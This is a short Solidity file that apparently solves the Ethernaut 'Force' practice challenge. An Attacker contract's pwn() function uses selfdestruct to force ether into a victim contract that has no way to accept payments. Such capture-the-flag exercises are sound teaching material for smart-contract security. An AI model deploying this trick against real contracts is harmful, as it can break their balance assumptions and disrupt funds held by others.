// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract Attacker {
    address payable immutable victimAddress;

    constructor(address payable victimAddress_) {
        victimAddress = victimAddress_;
    }

    function pwn() external payable {
        selfdestruct(victimAddress);
    }
}
